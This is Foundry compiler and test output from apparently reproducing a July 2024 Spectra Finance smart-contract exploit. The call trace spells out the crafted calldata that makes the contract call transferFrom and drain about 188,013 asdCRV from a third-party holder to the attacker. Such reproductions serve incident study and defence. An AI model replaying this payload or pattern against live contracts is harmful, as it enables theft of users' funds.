Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2024-07/Spectra_finance_exp.sol:14:1:
   |
14 | contract ContractTest is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2024-07/Spectra_finance_exp.sol:36:5:
   |
36 |     fallback() external payable{}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2024-07/Spectra_finance_exp.sol:34:9:
   |
34 |         address(VulnContract).call(abi.encodeWithSelector(bytes4(0x3593564c), command,data,block.timestamp+20));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 381.50ms (587.39µs CPU time)

Ran 1 test for src/test/2024-07/Spectra_finance_exp.sol:ContractTest
[PASS] testExploit() (gas: 82328)
Logs:
  [Begin] Attacker asdCRV balance before exploit: 0.000000000000000000
  [End] Attacker asdCRV balance after exploit: 188013.365080870249823427

Traces:
  [108175] ContractTest::testExploit()
    ├─ [9919] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2676] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3132] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::decimals() [staticcall]
    │   ├─ [2392] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "[Begin] Attacker asdCRV balance before exploit", val: 0, decimals: 18)
    ├─ [3419] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::balanceOf(0x279a7DBFaE376427FFac52fcb0883147D42165FF) [staticcall]
    │   ├─ [2676] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::balanceOf(0x279a7DBFaE376427FFac52fcb0883147D42165FF) [delegatecall]
    │   │   └─ ← [Return] 188013365080870249823427 [1.88e23]
    │   └─ ← [Return] 188013365080870249823427 [1.88e23]
    ├─ [65604] 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a::execute(0x12, [0x00000000000000000000000043e54c2e7b3e294de3a155785f52ab49d87b9922000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000279a7dbfae376427ffac52fcb0883147d42165ff0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000027d03995eb8cff1bfcc300000000000000000000000000000000000000000000000000000000], 1721746447 [1.721e9])
    │   ├─ [60554] 0x51BdbfCd7656e2C25Ad1BC8037F70572B7142eCC::execute(0x12, [0x00000000000000000000000043e54c2e7b3e294de3a155785f52ab49d87b9922000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000279a7dbfae376427ffac52fcb0883147d42165ff0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000027d03995eb8cff1bfcc300000000000000000000000000000000000000000000000000000000], 1721746447 [1.721e9]) [delegatecall]
    │   │   ├─ [34486] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::transferFrom(0x279a7DBFaE376427FFac52fcb0883147D42165FF, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 188013365080870249823427 [1.88e23])
    │   │   │   ├─ [33734] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::transferFrom(0x279a7DBFaE376427FFac52fcb0883147D42165FF, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 188013365080870249823427 [1.88e23]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x279a7DBFaE376427FFac52fcb0883147D42165FF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 188013365080870249823427 [1.88e23])
    │   │   │   │   ├─ emit Approval(owner: 0x279a7DBFaE376427FFac52fcb0883147D42165FF, spender: 0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [1419] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [676] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 188013365080870249823427 [1.88e23]
    │   └─ ← [Return] 188013365080870249823427 [1.88e23]
    ├─ [1132] 0x43E54C2E7b3e294De3A155785F52AB49d87B9922::decimals() [staticcall]
    │   ├─ [392] 0x606e2D9Ba601662881B260BB6C2dc3B10D0ABb2E::decimals() [delegatecall]
    │   │   └─ ← [Return] 18
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "[End] Attacker asdCRV balance after exploit", val: 188013365080870249823427 [1.88e23], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.69s (858.31ms CPU time)

Ran 2 test suites in 2.01s (2.07s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
